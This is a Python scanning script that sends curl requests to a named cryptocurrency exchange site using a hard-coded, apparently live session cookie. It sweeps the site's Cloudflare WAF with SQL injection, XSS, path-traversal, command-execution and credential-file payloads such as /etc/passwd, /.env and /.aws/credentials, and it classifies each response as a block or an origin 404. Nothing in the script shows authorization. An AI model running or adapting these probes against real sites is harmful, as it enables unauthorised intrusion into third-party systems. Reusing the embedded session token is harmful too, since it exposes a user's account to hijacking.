import subprocess

BASE = "https://bitcoinvn.io"
COOKIE = "REMEMBERME=%3Ab21uaWNvbm5lY3QwMEBnbWFpbC5jb20~%3A1794982284%3Alogin-method-v1%3AWyJnb29nbGUiLGZhbHNlLCJXaGt0cWxCVUwtdUlLRkI0M1AyQkcxNTJ2UFdXWktfdjhocUVUNzlvbUh3fjU2d0hobWFPRF9Ed0sySzlCUFJmOWpiOWd0dGpzUkJHQWNsMTNBQmZPbWN%2BIl0%3D%3Aca962b8ce904172eb281811fdf1f84efb603a9dc7f3f6382aa79fdf87866f46f; SID=002ed1eb0006b3d9e084200584a9250a"
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

def probe(path):
    cmd = ["curl", "-s", "-D", "/tmp/h.txt", "-o", "/tmp/b.txt", "--max-time", "10",
           "-H", f"Cookie: {COOKIE}", "-H", f"User-Agent: {UA}", BASE + path]
    subprocess.run(cmd, capture_output=True, text=True, timeout=15)
    with open("/tmp/h.txt") as f: hd = f.read()
    with open("/tmp/b.txt", errors="replace") as f: body = f.read()
    status = hd.split("\r\n")[0].split(" ")[1] if hd else "?"
    server = ""
    for ln in hd.split("\r\n"):
        if ln.lower().startswith("server:"): server = ln.split(":",1)[1].strip()
    return status, len(body), server, body[:120].replace("\n"," ").strip()

# Baseline: known-benign nonexistent URL => origin 404 signature
print("=== BASELINE ===")
for p in ["/zzz-not-real-abc", "/api/v1/debug"]:
    s,l,srv,b = probe(p)
    print(f"{p:<30} {s} len={l} srv={srv}\n   body: {b}\n")

print("=== BLOCKED SET (403) - confirm Cloudflare WAF page ===")
for p in ["/.env", "/union+select", "/shell.php"]:
    s,l,srv,b = probe(p)
    print(f"{p:<30} {s} len={l} srv={srv}\n   body: {b}\n")

print("=== EXPANDED KEYWORD SWEEP ===")
tests = {
  "SQLi kw":      ["/?q=union select", "/?id=1 or 1=1", "/?q='; drop table users--", "/?x=sleep(5)", "/?q=information_schema"],
  "XSS kw":       ["/?v=<img src=x onerror=alert(1)>", "/search?q=javascript:alert(1)", "/?p=<svg onload=1>"],
  "LFI/path":     ["/?file=../..//etc/passwd", "/?page=php://filter", "/include?src=/proc/self/environ"],
  "RCE/webshell": ["/?cmd=id", "/?exec=cat /etc/shadow", "/cgi-bin/test.cgi", "/?eval=system('ls')"],
  "Sensitive dot":[ "/.git/HEAD", "/.aws/credentials", "/config.yml", "/web.config", "/backup.zip"],
  "Admin/framework":[ "/admin/login", "/_profiler/open", "/_wdt/trace", "/actuator/env", "/telescope/requests"],
  "PHP/CMS probes": ["/xmlrpc.php", "/wp-login.php", "/wp-config.php.bak", "/phpunit", "/composer.json"],
}
for group, plist in tests.items():
    print(f"\n--- {group} ---")
    for p in plist:
        try:
            s,l,srv,b = probe(p)
            tag = "CF-BLOCK" if s=="403" and l>100000 else ("ORIGIN-404" if s=="404" else s)
            print(f"  {p:<45} {s:<4} len={l:<7} [{tag}]")
        except Exception as e:
            print(f"  {p:<45} ERR {e}")
